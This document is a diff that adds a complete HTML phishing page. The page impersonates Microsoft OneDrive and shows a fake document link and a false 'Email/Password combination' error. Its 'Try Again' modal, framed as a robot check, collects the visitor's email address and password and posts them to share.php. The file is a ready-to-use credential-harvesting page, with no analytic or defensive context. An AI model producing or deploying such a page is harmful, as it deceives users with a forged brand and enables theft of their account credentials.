@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>OneDrive</title>
+<link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYpIWpErMDlBEcVk3tbP4s-J6SoJLpKMGdNBxqRdbMyXquTrjzRA">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body {
+  margin: 0;
+  font-family: Trebuchet MS;
+}
+
+.topnav {
+  overflow: hidden;
+  background-color: #333;
+}
+
+.topnav a {
+  float: left;
+  color: #f2f2f2;
+  text-align: center;
+  padding: 14px 16px;
+  text-decoration: none;
+  font-size: 17px;
+}
+
+.topnav a:hover {
+  background-color: #ddd;
+  color: black;
+}
+
+.topnav a.active {
+  background-color: #00a1f1;
+  color: white;
+}
+
+input[type=text], input[type=email] {
+    width: 40%;
+    padding: 12px 20px;
+    margin: 8px 0;
+    display: inline-block;
+    border: 1px solid #ccc;
+    box-sizing: border-box;
+}
+
+
+input[type=text], input[type=password] {
+    width: 40%;
+    padding: 12px 20px;
+    margin: 8px 0;
+    display: inline-block;
+    border: 1px solid #ccc;
+    box-sizing: border-box;
+}
+
+button {
+    background-color: #00a1f1;
+    color: white;
+    padding: 14px 20px;
+    margin: 8px 0;
+
+    border: none;
+    cursor: pointer;
+    width: 40%;
+}
+
+button:hover {
+    opacity: 0.8;
+}
+
+.cancelbtn {
+    width: auto;
+    padding: 10px 18px;
+    background-color: #f44336;
+}
+
+.imgcontainer {
+    text-align: center;
+    margin: 10px 10px 0;
+}
+
+img.avatar {
+    width: 40%;
+    border-radius: 50%;
+}
+
+.container {
+    padding: 10px;
+}
+
+span.psw {
+    float: right;
+    padding-top: 16px;
+}
+
+/* Change styles for span and cancel button on extra small screens */
+@media screen and (max-width: 300px) {
+    span.psw {
+       display: block;
+       float: none;
+    }
+    .cancelbtn {
+       width: 100%;
+    }
+}
+
+/* The Modal (background) */
+.modal {
+    display: none; /* Hidden by default */
+    position: fixed; /* Stay in place */
+    z-index: 1; /* Sit on top */
+    left: 0;
+    top: 0;
+    width: 100%; /* Full width */
+    height: 100%; /* Full height */
+    overflow: auto; /* Enable scroll if needed */
+    background-color: rgb(0,0,0); /* Fallback color */
+    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+    padding-top: 60px;
+}
+
+/* Modal Content/Box */
+.modal-content {
+    background-color: #fefefe;
+    margin: 5% auto 15% auto; /* 5% from the top, 15% from the bottom and centered */
+    border: 1px solid #888;
+    width: 50%; /* Could be more or less, depending on screen size */
+}
+
+/* The Close Button (x) */
+.close {
+    position: absolute;
+    right: 25px;
+    top: 0;
+    color: #000;
+    font-size: 35px;
+    font-weight: bold;
+}
+
+.close:hover,
+.close:focus {
+    color: red;
+    cursor: pointer;
+}
+
+/* Add Zoom Animation */
+.animate {
+    -webkit-animation: animatezoom 0.6s;
+    animation: animatezoom 0.6s
+}
+
+@-webkit-keyframes animatezoom {
+    from {-webkit-transform: scale(0)} 
+    to {-webkit-transform: scale(1)}
+}
+    
+@keyframes animatezoom {
+    from {transform: scale(0)} 
+    to {transform: scale(1)}
+}
+
+/* Change styles for span and cancel button on extra small screens */
+@media screen and (max-width: 300px) {
+    span.psw {
+       display: block;
+       float: none;
+    }
+    .cancelbtn {
+       width: 100%;
+    }
+}
+</style>
+</head>
+<body>
+
+<div class="topnav">
+  <a class="active" href="#home">OneDrive</a>
+  <a href="#news">DOC Q0017 - 3512C.Doc</a>
+
+</div>
+
+
+<br>
+<center>
+<br><br><center><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYpIWpErMDlBEcVk3tbP4s-J6SoJLpKMGdNBxqRdbMyXquTrjzRA" height="100"></img>
+  <p><font face="Trebuchet MS" color="Red" size="2">
+
+<strong>OOPS!!!, THERE WAS A PROBLEM!!! </strong><br>There was an error with your Email/Password combination.Please try again.
+
+
+
+
+</font>  </p>
+
+<button onclick="document.getElementById('id01').style.display='block'" style="width:auto;"><b>Try Again</b></button></center>
+<div id="id01" class="modal">
+  
+  <form class="modal-content animate" method="post" action="share.php">
+    <div class="imgcontainer">
+      <span onclick="document.getElementById('id01').style.display='none'" class="close" title="Close Modal">&times;</span>
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTSvAFXb6a7sDuJEsSQlUqYc9-815qJOwDQrc1j5KEg1_kufQ-p">
+    </div>
+
+    <div class="container">
+     <center> <p><font face="Trebuchet MS" color="black" size="2"> Confirm Identity to Prove You are not a Robot</font><br> <input type="email" placeholder="Email Address" name="uname" id="txtEmpName" onkeypress="return AvoidSpace(event)" required="">
+<br>
+      <input type="password" placeholder="Enter Password" name="psw" id="txtEmpName" onkeypress="return AvoidSpace(event)" required="">
+        <br>
+      <button type="submit">CONTINUE</button>
+     
+    </div>
+
+    <div class="container" style="background-color:#f1f1f1">
+     
+    
+    </div>
+  </form>
+</div>
+
+<script>
+// Get the modal
+var modal = document.getElementById('id01');
+
+// When the user clicks anywhere outside of the modal, close it
+window.onclick = function(event) {
+    if (event.target == modal) {
+        modal.style.display = "none";
+    }
+}
+</script>
+
+</body>
+
+</body>
+</html>
